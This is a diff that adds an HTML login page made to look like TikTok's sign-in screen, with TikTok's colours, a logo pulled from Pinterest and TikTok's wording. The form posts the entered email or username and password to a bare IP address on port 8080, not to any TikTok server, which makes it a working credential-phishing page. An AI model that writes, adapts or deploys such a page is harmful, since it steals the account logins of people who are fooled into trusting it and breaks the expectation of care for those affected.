@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Giriş Yap</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #fff; width: 400px; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .logo img { width: 120px; height: auto; display: block; margin: 0 auto 24px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #161823; text-align: center; }
+        p.sub { color: #6b6b6b; font-size: 14px; margin-bottom: 24px; text-align: center; }
+        .input-group { margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 4px; color: #161823; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #c4c4c4; border-radius: 4px; font-size: 16px; background: #f8f8f8; }
+        .input-group input:focus { border-color: #fe2c55; outline: none; background: #fff; }
+        .btn { width: 100%; padding: 12px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .btn:hover { background: #e02040; }
+        .signup { text-align: center; margin-top: 20px; font-size: 14px; color: #6b6b6b; }
+        .signup a { color: #fe2c55; text-decoration: none; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"><img src="https://i.pinimg.com/736x/b7/ee/a4/b7eea46bfb52df84578bb451c69b9894.jpg" alt="TikTok"></div>
+        <h1>Log in to TikTok</h1>
+        <p class="sub">Manage your account, check notifications, comment on videos, and more.</p>
+        <form method="POST" action="http://109.228.249.6:8080/login">
+            <div class="input-group">
+                <label for="email">Email or username</label>
+                <input type="text" id="email" name="email" placeholder="Email or username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn">Log in</button>
+        </form>
+        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+</body>
+</html>
